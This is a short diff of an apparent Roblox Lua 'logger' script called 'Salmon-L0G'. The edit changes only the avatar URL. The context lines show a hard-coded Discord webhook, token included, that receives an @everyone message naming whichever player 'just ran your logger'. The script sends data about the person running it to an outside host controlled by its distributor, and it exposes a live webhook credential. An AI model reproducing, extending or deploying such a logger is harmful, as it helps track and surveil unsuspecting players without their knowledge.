@@ -13,7 +13,7 @@ local url =
    "https://discord.com/api/webhooks/1394003704746741781/sCHgs18dUx_faqRL7KJZkmngr97mY3wGnuXCDxktZwc0xa2ifOC90cp7P5MqMtercJvH" --pretty obvious what to do here
 local data = {
             ["username"] = "Salmon-L0G", --webhook name thing idk
-            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
+            ["avatar_url"] = "https://cdn.discordapp.com/attachments/1391033797738365050/1398165474549956639/IMG_7353.png?ex=68850751&is=6883b5d1&hm=2eb061a35298cd7b8de7813690d66f36073e8c000175c6e48bbfaca6ec67f6b8&", --avatar image url
     
     ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
     ["embeds"] = {
